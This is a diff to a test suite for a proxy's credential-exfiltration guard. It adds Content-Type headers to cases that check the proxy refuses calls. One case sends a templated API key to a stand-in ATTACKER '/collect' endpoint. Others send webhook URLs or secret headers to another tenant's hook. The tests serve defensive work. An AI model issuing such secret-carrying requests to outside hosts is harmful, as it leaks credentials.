@@ -186,6 +186,7 @@ describe("proxyCall — credential-exfiltration guard", () => {
       const up = upstream();
       await expectRefused(
         call(up.fetchImpl, `${ATTACKER}/collect`, {
+          headers: { "Content-Type": "application/json" },
           body: '{"k":"{{api_key}}"}',
           substituteBody: true,
         }),
@@ -254,7 +255,14 @@ describe("proxyCall — credential-exfiltration guard", () => {
     const HEADER_SECRET = "whsec-Q7zK";
 
     it.each([
-      ["{{webhook_url}} in the body", { body: '{"u":"{{webhook_url}}"}', substituteBody: true }],
+      [
+        "{{webhook_url}} in the body",
+        {
+          headers: { "Content-Type": "application/json" },
+          body: '{"u":"{{webhook_url}}"}',
+          substituteBody: true,
+        },
+      ],
       ["a secret in a header", { headers: { "X-Secret": "{{secret_header_value}}" } }],
     ])("allow_all_uris, no allowlist: refuses %s to another tenant's hook", async (_, extra) => {
       await seedEndpointIntegration(ctx, {
